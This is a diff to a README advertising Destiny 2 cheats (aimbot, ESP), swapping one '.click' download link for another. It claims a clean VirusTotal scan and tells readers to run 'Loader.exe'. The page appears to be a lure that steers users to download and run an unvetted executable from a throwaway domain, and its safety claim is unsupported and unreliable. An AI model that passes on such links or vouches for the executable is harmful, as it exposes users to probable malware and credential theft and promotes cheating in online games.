@@ -59,7 +59,7 @@ Destiny 2 Hacks &amp; Cheats 🔥 AIMBOT - ESP | PvE &amp; PvP | Intel &amp; AMD
 
 ## ⬇️ Download
 
-### [Download](https://anydownloadloader.click/)
+### [Download](https://getloader.click/)
 
 > ✅ VirusTotal Scan Result: **0 / 72** detections  
 > 📁 **To start:** run `Loader.exe`  
